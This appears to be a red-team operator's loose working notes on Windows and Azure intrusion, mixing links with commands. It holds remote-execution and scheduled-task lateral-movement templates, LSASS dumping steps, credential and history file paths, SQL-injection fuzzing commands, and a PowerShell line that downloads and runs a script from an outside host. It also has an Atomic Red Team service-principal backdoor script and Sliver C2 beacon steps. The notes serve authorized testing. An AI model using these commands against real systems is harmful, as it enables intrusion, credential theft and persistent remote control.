https://github.com/SafeBreach-Labs/PoolParty

https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf
https://www.blackhat.com/eu-23/briefings/schedule/#the-pool-party-you-will-never-forget-new-process-injection-techniques-using-windows-thread-pools-35446

https://www.shellterproject.com/tipstricks/


Software Deployment tools Radmin/PDQ/RAT
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1072/T1072.md

Pass The Hash
https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1550.002
Note: must dump hashes first
[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)

Pass the ticket 
https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1550.003

RDP Lateral Movement
https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1021.001

WinRM/Evil-WinRM
https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1021.006

Remote Services: SMB/Windows Admin Shares
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md

Remote Service Session Hijackng: RDP Hijacking
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1563.002/T1563.002.md

Remote Services: Distributed Component Object Model
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.md
https://www.cobaltstrike.com/blog/scripting-matt-nelsons-mmc20-application-lateral-movement-technique
https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922

WMIC
wmic /node:"{{ target }}" process call create "{{ command }}"

Create remote scheduled task
schtasks /create /s {{ target }} /tn "{{ task_name }}" /ru SYSTEM /tr "C:\Windows\System32\rundll32.exe {{ dll_payload }} {{ export }}" /sc onstart

User Impersonation
SensePost | Abusing windows’ tokens to compromise active directory without touching lsass


Extract passwords (chrome, etc)
https://github.com/GhostPack/SharpDPAPI


Collect clipboard data T1115
https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1115

LSASS

https://learn.microsoft.com/en-us/troubleshoot/windows-client/performance/generate-a-kernel-or-complete-crash-dump

To enable memory dump setting, follow these steps:
	1. In Control Panel, select System and Security > System.
	2. Select Advanced system settings, and then select the Advancedtab.
	3. In the Startup and Recovery area, select Settings.
	4. Make sure that Kernel memory dump or Complete memory dump is selected under Writing Debugging Information.
	5. Restart the computer.

Generate BSOD -> e.g.: notmyfault

Volatility3 -> lsass dump

Mimikatz on local machine

Outlook emails

\Users\user\AppData\Local\Microsoft\Outlook

PowerShell history

C:\Users\<>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

Chrome History

C:\Users\<>\AppData\Local\Google\Chrome\User Data\Default\History

Credentials Dump?
Rundll32 keymgr.dll, KRShowKeyMgr


Forensic artifacts
Forensic artifacts
SANS_DFPS_FOR500_v4.17_02-23.pdf (egnyte.com)

Azure JSON Web Token ("JWT") Manipulation Toolset
https://github.com/rvrsh3ll/TokenTactics

RoadRecon - Azure Enumeration tool 
https://github.com/dirkjanm/ROADtools

AzureHound
https://github.com/BloodHoundAD/AzureHound


Password spraying for MS365/Azure accounts
https://github.com/dafthack/MSOLSpray


BadZure - tool to create vulnerable test lab in Azure

SpectreOps Service principal abuse
https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5


• MsOnline 
        https://learn.microsoft.com/en-us/powershell/module/msonline/?view=azureadps-1.0

• Azure AD
	https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0

• Azure AZ
	https://learn.microsoft.com/en-us/powershell/azure/what-is-azure-powershell?view=azps-9.7.1

• Microsoft Graph SDK
	https://learn.microsoft.com/en-us/powershell/microsoftgraph/overview?view=graph-powershell-1.0

Bloodhound-python collector - kali tool 
bloodhound-python -v -d xxx -u user -dc  dcname -w 5 -c Container -op container
bloodhound-python -v -d xxx -u user -dc dcname -w 5 -c trusts -op trusts

Wfuzz -f ./output.txt,csv  -w /usr/share/SecLists-master/Fuzzing/SQLi/Generic-SQLi.txt "https://website.com/search?searchPageType=&text=FUZZ"

-H "myheader: headervalue" -H "User-Agent: Googlebot-News"

-H "User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0"

+encoding:
wfuzz -w /usr/share/SecLists-master/Fuzzing/SQLi/Generic-SQLi.txt,md5-uri_unicode "https://website.com/search?searchPageType=&text=FUZZ"


+another encoding
wfuzz -w /usr/share/SecLists-master/Fuzzing/XSS-Fuzzing,none-base64-md5 "https://website.com/search?searchPageType=&text=FUZZ"

-ExecutionPolicy Bypass -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol
= [Net.SecurityProtocolType]::Tls12; Invoke-Expression (New-Object
Net.WebClient).DownloadString('https[:]//xerixwebstudio[.]com/documents.txt')"

Rubrik Tools

Add this line to the ~/.bashrc file:
exportPROMPT_COMMAND="echo -n \[\$(date +%H:%M:%S)\]\ "
So the output will be something like:
[07:00:31] user@name:~$
Powershell script to pull resources in all resource groups which contains name saved in file 


Command: 
.\Export-Test-Resources.ps1 -FilterFilePath "<filterfile>" -OutputFilePath "<outputfile>"


Script: 

param (
    [string]$FilterFilePath,    # Path to the file containing filter texts
    [string]$OutputFilePath = "C:\resources.csv"  # Default output file path
)

# Connect to Azure
Connect-AzAccount -Tenant xx -Subscription xx

# Read filter texts from the file if a file path is provided
if ($FilterFilePath) {
    try {
        $filterTexts = Get-Content -Path $FilterFilePath -ErrorAction Stop
    } catch {
        Write-Host "Failed to read filter file: $FilterFilePath"
        exit
    }
} else {
    Write-Host "No filter file path provided."
    exit
}

# Get the list of subscriptions
$subscriptions = Get-AzSubscription

# Initialize an array to hold the resource information
$resourceInfo = @()

# Loop through each subscription
foreach ($subscription in $subscriptions) {
    try {
        # Set the context to the current subscription
        Set-AzContext -SubscriptionId $subscription.Id -ErrorAction Stop

        Write-Host "Processing subscription: $($subscription.Name) ($($subscription.Id))"

        # Get all resource groups in the current subscription
        $resourceGroups = Get-AzResourceGroup

        # Loop through each filter text and filter resource groups
        foreach ($filterText in $filterTexts) {
            $filteredResourceGroups = $resourceGroups | Where-Object { $_.ResourceGroupName -like "*$filterText*" }

            # Loop through each filtered resource group and list resources
            foreach ($rg in $filteredResourceGroups) {
                $resources = Get-AzResource -ResourceGroupName $rg.ResourceGroupName
                foreach ($resource in $resources) {
                    # Create a custom object to hold resource information
                    $resourceObject = [PSCustomObject]@{
                        SubscriptionId    = $subscription.Id
                        SubscriptionName  = $subscription.Name
                        ResourceGroupName = $rg.ResourceGroupName
                        ResourceName      = $resource.Name
                        ResourceType      = $resource.ResourceType
                        ResourceLocation  = $resource.Location
                    }
                    # Add the custom object to the array
                    $resourceInfo += $resourceObject
                }
            }
        }
    } catch {
        Write-Host "Failed to process subscription: $($subscription.Name) ($($subscription.Id))"
    }
}

# Export the resource information to a CSV file
$resourceInfo | Export-Csv -Path $OutputFilePath -NoTypeInformation

Write-Host "Resource information has been exported to $OutputFilePath"
Disconnect-AzAccount

$AzureApplicationID="xx"
$AzureTenantID="xx"
$AzurePassword=ConvertTo-SecureString$AppPassword.value-AsPlainText -Force
$psCred=New-ObjectSystem.Management.Automation.PSCredential($AzureApplicationID,$AzurePassword)
Connect-AzAccount-Credential $psCred-TenantID $AzureTenantID-ServicePrincipal

https://atomicredteam.io/privilege-escalation/T1098.001/



Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
Connect-AzureAD -Credential $Credential > $null
$sp = Get-AzureADServicePrincipal -SearchString "#{service_principal_name}" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry
$cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host "Generated certificate ""$($cert.Thumbprint)"""
New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
Write-Host "End of Hijacking
SLIVER Commands:
Generate beacon
generate beacon --os linux --format shared --run-at-load --http <ip>


Start https listener
https -L IP

List beacons 
Beacons

Use beacon 
Use 

Launch interactive session
Interactive

List, connect to session: 
Sessions 
Sessions -i <id> 



Target machine:
LD_PRELOAD=./<beaconfile.so> bash 



You cant "execute" very many special characters. Here is a shortcu
You cant do grep password *, you cant pipe |, you cant semi colon ; and I couldn’t get brackets to work {}
So instead go to a small directory and do a 
Execute -o grep -r password .
If you do that in a large directory you will lose your beacon - it must be a small directory that it can finish in

Test:


Here it was in my home directory, which was too big and it never returned


In actual use

exe

List all shares

ex


precmd() {
    echo "$(date -u +%F);$(date -u +%r);$(date -u +%Z);$(whoami);$(hostname);$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1);$PWD;$(fc -ln -1)" \
      >> ~/.full_history
}
